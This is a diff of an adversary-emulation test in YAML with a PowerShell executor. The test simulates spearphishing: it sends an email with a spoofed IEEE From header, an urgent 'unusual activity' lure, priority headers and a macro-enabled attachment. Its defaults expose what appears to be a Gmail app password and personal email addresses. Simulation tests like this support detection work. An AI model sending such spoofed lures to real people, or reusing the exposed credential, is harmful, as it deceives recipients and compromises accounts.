@@ -1,64 +1,100 @@
-attack_technique: T1566
-display_name: Phishing
+attack_technique: T1566.001
+display_name: 'Phishing: Spearphishing Attachment'
 atomic_tests:
-  - name: Phishing email with spoofed From (via hMailServer)
-    description: Simulate phishing email sent through local SMTP server with spoofed sender.
+  - name: Simulate sending a phishing email with a malicious attachment via SMTP with spoofed From
+    auto_generated_guid: custom-guid-phishing-attachment
+    description: |
+      This test simulates sending a phishing email with a malicious attachment, while spoofing the From: header.
+      WARNING: THIS IS A SIMULATION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
     supported_platforms:
       - windows
     input_arguments:
       smtp_server:
-        description: SMTP server address
-        type: String
-        default: "127.0.0.1"
+        description: SMTP server to use
+        type: string
+        default: "localhost"  # hMailServer in local environment
       smtp_port:
-        description: SMTP server port
-        type: Integer
-        default: 25
+        description: SMTP port
+        type: integer
+        default: 25  # Standard SMTP port
       sender_email:
-        description: Real sender email address (used internally by hMailServer)
-        type: String
-        default: "oumayma@pfe.com"
+        description: Real email address for SMTP authentication (Return-Path)
+        type: string
+        default: "chaymaoumayma2003@gmail.com"  # Replace with your domain for Return-Path
       sender_visible_email:
-        description: Spoofed visible From address
-        type: String
-        default: "chaymabouattour@ieee.org"
+        description: Email address visible in the "From" field (Spoofed)
+        type: string
+        default: "IEEE Notification <chaymabouattour@ieee.org>"  # Spoofed email address
+      reply_to_email:
+        description: Reply-To email address
+        type: string
+        default: "chaymaoumayma2003@gmail.com"  # Reply-to address matching Return-Path
       recipient_email:
-        description: Gmail recipient
-        type: String
-        default: "oumaymakabadou2@gmail.com"
+        description: Recipient email address
+        type: string
+        default: "oumaymakabadou2@gmail.com"  # Replace with the actual recipient's email address
       subject:
-        description: Email subject
-        type: String
-        default: "⚠️ Urgent: Please review the attached document"
+        description: Customized subject of the email
+        type: string
+        default: "Urgent: Please review the attached document"
       body:
-        description: Email body (HTML)
-        type: String
-        default: "Dear User,<br>We detected unusual activity. Please review the attached file.<br>Thanks."
+        description: Customized body content of the email
+        type: string
+        default: |
+          Dear User,<br>
+          We have detected unusual activity on your account. To secure your data, please review the attached document as soon as possible.<br>
+          Thank you for your cooperation.<br>
+          Best regards,<br>
+          The Security Team
       attachment_path:
-        description: Attachment path
-        type: String
-        default: "C:\\temp\\PhishingAttachment.xlsm"
+        description: Path to the malicious attachment
+        type: string
+        default: "C:\\temp\\PhishingAttachement.xlsm"  # Ensure this matches the actual path
+      app_password:
+        description: Application password for SMTP authentication
+        type: string
+        default: "wbae yozc iyut rykk"  # Application password generated for Gmail
+      log_file:
+        description: Path to the log file
+        type: string
+        default: "C:\\Users\\chaym\\phishing_script.log"  # Path for logging the result
     executor:
       name: powershell
+      elevation_required: false
       command: |
         $smtpServer = "#{smtp_server}"
-        $smtpPort = #{smtp_port}
-        $senderReal = "#{sender_email}"
-        $senderVisible = "#{sender_visible_email}"
-        $recipient = "#{recipient_email}"
+        $smtpPort = "#{smtp_port}"
+        $senderEmail = "#{sender_email}"  # Real address for SMTP authentication (Return-Path)
+        $senderVisibleEmail = "#{sender_visible_email}"  # Spoofed address in From: field
+        $replyTo = "#{reply_to_email}"  # Reply-To address
+        $recipientEmail = "#{recipient_email}"
         $subject = "#{subject}"
         $body = "#{body}"
-        $attachment = "#{attachment_path}"
+        $attachmentPath = "#{attachment_path}"
+        $securePassword = ConvertTo-SecureString "#{app_password}" -AsPlainText -Force
+        $credential = New-Object System.Management.Automation.PSCredential($senderEmail, $securePassword)
+        
+        # Custom headers to increase the spoofing realism
+        $headers = @{
+            "X-Priority" = "1"  # High priority
+            "X-MSMail-Priority" = "High"  # Mail priority
+            "Importance" = "High"  # Importance level
+        }
 
-        Write-Host "📨 Envoi d'un email avec From: falsifié via hMailServer..."
-
+        Write-Host "📧 Sending a phishing email with spoofed From header..."
         try {
-            Send-MailMessage -SmtpServer $smtpServer -Port $smtpPort `
-                -From $senderVisible -To $recipient `
+            # Sending the email with spoofed From and customized headers
+            Send-MailMessage -SmtpServer $smtpServer -Port $smtpPort -UseSsl `
+                -From $senderVisibleEmail -To $recipientEmail `
                 -Subject $subject -BodyAsHtml $body `
-                -Attachments $attachment `
-                -ErrorAction Stop
-            Write-Host "✅ Email envoyé avec succès."
+                -Attachments $attachmentPath -Credential $credential `
+                -Headers $headers -ErrorAction Stop
+            Write-Host "✅ Email sent successfully."
+            
+            # Log the result
+            $logEntry = "Email sent to $recipientEmail successfully at $(Get-Date)"
+            Add-Content -Path "#{log_file}" -Value $logEntry
         } catch {
-            Write-Host "❌ Échec de l'envoi de l'email : $_"
+            Write-Host "❌ Error sending email: $_"
+            exit 1
         }
